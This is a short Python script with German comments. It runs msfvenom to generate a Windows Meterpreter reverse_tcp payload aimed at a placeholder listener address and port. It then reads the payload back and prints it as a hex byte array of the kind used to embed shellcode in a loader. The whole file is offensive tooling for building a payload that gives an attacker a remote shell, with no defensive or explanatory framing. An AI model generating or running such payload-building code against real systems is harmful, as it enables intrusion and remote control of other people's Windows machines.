import subprocess

# Erzeugen Sie den Payload und speichern Sie ihn in einer Datei
subprocess.run("msfvenom -p windows/meterpreter/reverse_tcp LHOST=your_ip LPORT=your_port -f raw -o payload.bin", shell=True)

# Lesen Sie den Payload aus der Datei
with open("payload.bin", "rb") as f:
    payload = f.read()

# Konvertieren und ausgeben
hex_payload = ", ".join([f"0x{byte:02X}" for byte in payload])
print(hex_payload)
